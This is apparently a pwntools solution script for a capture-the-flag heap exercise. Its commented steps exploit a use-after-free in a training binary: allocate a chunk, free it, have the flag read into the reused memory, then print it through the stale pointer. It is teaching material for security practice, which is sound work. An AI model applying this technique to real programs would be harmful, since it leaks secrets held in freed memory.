from pwn import *
p = process('/babyheap_level1_teaching1')
# allocate the buffer of size 989
# since we know from source code a buffer of that size
# will be allocated and the first 128 bytes will have
# the flag written into it
p.send(b'malloc\n989\n')
# free the chunk of memory
# the program keeps the pointer
p.send(b'free\n')
# put the data from /flag into a buffer
# in the same area of memory that was freed
p.send(b'read_flag\n')
# read from the deallocated pointer
# which now points to the buffer with the flag
p.sendline(b'puts')
for i in range(15):
	print(p.recvline())
log.info(p.recvline().decode('utf-8'))
p.close()
